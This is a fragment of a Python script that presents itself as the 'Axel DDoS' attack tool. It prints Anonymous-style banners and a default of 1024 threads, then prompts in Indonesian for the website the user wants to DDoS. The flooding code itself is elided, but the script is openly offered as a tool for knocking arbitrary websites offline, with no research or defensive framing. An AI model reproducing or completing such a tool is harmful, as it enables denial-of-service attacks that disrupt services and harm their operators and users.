...
if str(platform.system()) == 'Linux':
    os.system('figlet Axel DDoS Attack')
else:
    os.system('pyfiglet Axel  DDoS Attack')

print(Back.GREEN + Fore.GREEN +'[+] Axel DDoS tool by' + Fore.RED + 'Anonymous Indonesia Community                              ') 
print(Back.GREEN + Fore.BLACK + '[+] Axel-DDoS Tool BETA VERSION 0.1                                             ')
print(Back.BLACK +Fore.GREEN + '[+] Axel-DDoS Tool Interactive Menu in Python by FlyMaybe Network                          ')
print(Fore.YELLOW + '[+] We are Anonymous, We are a Legion, We do not Forgive, We do not Forget                            ')
print(Fore.GREEN + '[+] Starting Axel DoS Tool with 1024 Baseline Threads as Default change below as Required           ')
print(Fore.BLUE + 'Author: ' + Fore.GREEN + 'FlyMaybe Network (KHUSUS LINUX)')
print(Fore.RED + 'Youtube: ' + Fore.GREEN + 'AxelSamp')
print(Fore.YELLOW + 'GitHub: ' + Fore.GREEN + 'PRIVATE')
print(Fore.YELLOW + Fore.BLUE +  'INFO: ' + Fore.GREEN + 'INI BUKAN SCRIPT SAYA SAYA DI SINI CUMAN MENGUPDATE SCRIT NYA')
...
try:
    ...
    site = input(Fore.BLUE + '[+] Masuk Kan Website Yang Mau Kamu' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
